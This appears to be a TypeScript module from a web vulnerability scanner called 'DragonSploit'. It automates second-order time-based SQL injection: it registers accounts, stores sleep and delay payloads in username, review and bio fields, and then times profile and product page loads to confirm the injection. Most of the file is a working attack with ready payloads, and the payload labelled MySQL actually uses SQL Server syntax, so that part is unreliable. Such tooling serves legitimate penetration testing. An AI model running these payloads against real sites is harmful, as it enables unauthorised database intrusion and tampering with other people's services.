import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import axios from 'axios';
import { executeRequest, delay, recordVulnerability } from './common';
import { URL } from 'url';

export async function executeSecondOrderAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId } = job.data;
    console.log('[Vector 4] Starting Second-Order Attack...');
    let found = false;

    const TIME_DELAY_THRESHOLD = 4000; // Threshold for detecting delay (ms)

    const attackVectors = [
        {
            name: "Username to Profile Page",
            injectionPoint: {
                path: "/api/register",
                method: "POST",
                payloadField: "username"
            },
            triggerPoint: {
                path: "/api/profile/{userId}",
                method: "GET"
            }
        },
        {
            name: "Product Review to Product Page",
            injectionPoint: {
                path: "/api/products/{productId}/reviews",
                method: "POST",
                payloadField: "comment"
            },
            triggerPoint: {
                path: "/api/products/{productId}",
                method: "GET"
            }
        },
        {
            name: "User Bio to Profile Page",
            injectionPoint: {
                path: "/api/profile/update",
                method: "POST",
                payloadField: "bio"
            },
            triggerPoint: {
                path: "/api/profile/{userId}",
                method: "GET"
            }
        }
    ];

    const timeBombPayloads = {
        MySQL: (field: string) => `${field}_value'; WAITFOR DELAY '0:0:5' --`,
        PostgreSQL: (field: string) => `${field}_value'; SELECT pg_sleep(5); --`,
        SQLite: (field: string) => {
            const unionSelect = Array(1000).fill(0).map((_, i) => `SELECT ${i + 1}`).join(' UNION ALL ');
            return `${field}_value' AND (SELECT COUNT(*) FROM (${unionSelect})) > 0 --`;
        }
    };

    for (const vector of attackVectors) {
        console.log(`[Vector 4] Testing Vector: ${vector.name}`);

        for (const [dbType, payloadFn] of Object.entries(timeBombPayloads)) {
            console.log(`[Vector 4] Testing Database Type: ${dbType}`);

            // Phase 1: The Plant (Injecting the Time Bomb)
            let injectionUrl = new URL(vector.injectionPoint.path, targetUrl).toString();
            const payloadValue = payloadFn(vector.injectionPoint.payloadField);
            const injectionPayload = { [vector.injectionPoint.payloadField]: payloadValue };

            // For product reviews, assume a productId is needed
            let productId: string | null = null;
            if (vector.injectionPoint.path.includes("{productId}")) {
                productId = "1"; // Replace with actual product ID if available
                injectionUrl = injectionUrl.replace("{productId}", productId);
            }

            let userId: string | null = null;
            try {
                // Register or update with clean data first to get a valid userId if needed
                if (vector.injectionPoint.path.includes("/api/register")) {
                    const cleanPayload = {
                        [vector.injectionPoint.payloadField]: `clean_${Math.random().toString(36).substring(2, 8)}`,
                        password: "test123"
                    };
                    const cleanResponse = await axios.post(injectionUrl, cleanPayload, {
                        headers: { 'User-Agent': 'DragonSploit/2.0' }
                    });
                    if (cleanResponse.status !== 200 && cleanResponse.status !== 201) {
                        console.log(`[Vector 4] Clean registration failed for ${vector.name}`);
                        continue;
                    }
                    userId = cleanResponse.data.userId || "1"; // Adjust based on actual API response
                }

                // Inject the malicious payload
                const injectionResponse = await axios.post(injectionUrl, injectionPayload, {
                    headers: { 'User-Agent': 'DragonSploit/2.0' }
                });
                if (injectionResponse.status !== 200 && injectionResponse.status !== 201) {
                    console.log(`[Vector 4] Injection failed for ${vector.name}, DB: ${dbType}`);
                    continue;
                }
                console.log(`[Vector 4] Injected payload for ${vector.name}, DB: ${dbType}`);

                // Ensure data is committed
                await delay(1000);

                // Phase 2: The Trigger (Waking the Beast)
                let triggerUrl = new URL(vector.triggerPoint.path, targetUrl).toString();
                if (vector.triggerPoint.path.includes("{userId}")) {
                    if (!userId) {
                        console.log(`[Vector 4] No userId available for ${vector.name}`);
                        continue;
                    }
                    triggerUrl = triggerUrl.replace("{userId}", userId);
                }
                if (vector.triggerPoint.path.includes("{productId}")) {
                    if (!productId) {
                        console.log(`[Vector 4] No productId available for ${vector.name}`);
                        continue;
                    }
                    triggerUrl = triggerUrl.replace("{productId}", productId);
                }

                // Measure baseline response time with a clean request
                const cleanTriggerUrl = new URL(vector.triggerPoint.path, targetUrl).toString()
                    .replace("{userId}", userId || "1")
                    .replace("{productId}", productId || "1");
                const baselineStart = Date.now();
                await executeRequest(cleanTriggerUrl);
                const baselineTime = Date.now() - baselineStart;
                console.log(`[Vector 4] Baseline response time for ${vector.name}: ${baselineTime}ms`);

                // Trigger the tainted data
                const triggerStart = Date.now();
                await executeRequest(triggerUrl);
                const triggerTime = Date.now() - triggerStart;
                console.log(`[Vector 4] Trigger response time for ${vector.name}: ${triggerTime}ms`);

                // Intelligent Success Detection
                if (triggerTime > baselineTime + TIME_DELAY_THRESHOLD) {
                    console.log(`[Vector 4] Second-Order SQLi Confirmed for ${vector.name}, DB: ${dbType}`);
                    const proof = `Payload: ${payloadValue}\nInjection Path: ${injectionUrl}\nTrigger Path: ${triggerUrl}\nBaseline Time: ${baselineTime}ms\nDelayed Time: ${triggerTime}ms`;
                    const description = `Second-Order SQLi confirmed via the '${vector.name}' vector. A payload stored in the '${vector.injectionPoint.payloadField}' field at '${injectionUrl}' was triggered when accessing '${triggerUrl}', causing a measurable execution delay.`;
                    await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.HIGH, description, proof);
                    found = true;
                    break; // Exit inner loop after success
                }
            } catch (error: any) {
                console.log(`[Vector 4] Error during ${vector.name}, DB: ${dbType}: ${error.message}`);
            }
        }

        if (found) {
            break; // Exit outer loop after finding one successful vector
        }
    }

    return found;
}